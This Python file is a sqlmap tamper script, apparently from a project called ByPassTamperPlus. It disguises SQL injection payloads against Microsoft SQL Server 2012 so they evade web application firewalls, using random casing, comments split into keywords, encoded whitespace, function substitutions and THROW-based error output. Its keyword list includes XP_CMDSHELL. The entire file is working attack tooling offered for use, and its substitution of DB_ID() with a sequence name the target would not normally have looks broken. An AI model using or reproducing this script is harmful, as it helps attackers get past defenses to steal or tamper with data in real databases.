#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2012_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|OFFSET|FETCH|NEXT|ROWS|ONLY|SEQUENCE|THROW|LEAD|LAG|OVER|CONCAT|FORMAT|IIF|CHOOSE|SYS\.TABLES|SYS\.COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)
    payload = re.sub(r"(?i)\bCASE\s+WHEN\s+(.+)\s+THEN\s+(.+)\s+ELSE\s+(.+)\s+END", r"IIF(\1, \2, \3)", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "TOP 1" in payload.upper():
        payload = re.sub(r"(?i)SELECT\s+TOP\s+1\s+(.+)\s+FROM", r"SELECT \1 FROM", payload)
        payload += " ORDER BY (SELECT NULL) OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY"

    if "DB_ID()" in payload.upper():
        payload = payload.replace("DB_ID()", "NEXT VALUE FOR seq_db_id")

    if "SELECT" in payload.upper() and "FROM" not in payload.upper() and random.getrandbits(1):
        payload = re.sub(r"(?i)SELECT\s+(.+)", r"THROW 50000, (\1), 1", payload)

    if "+" in payload and "'" in payload:
        payload = re.sub(r"'(.+?)'\+'(.+?)'", r"CONCAT('\1','\2')", payload)

    payload = general_obfuscate(payload)

    return payload
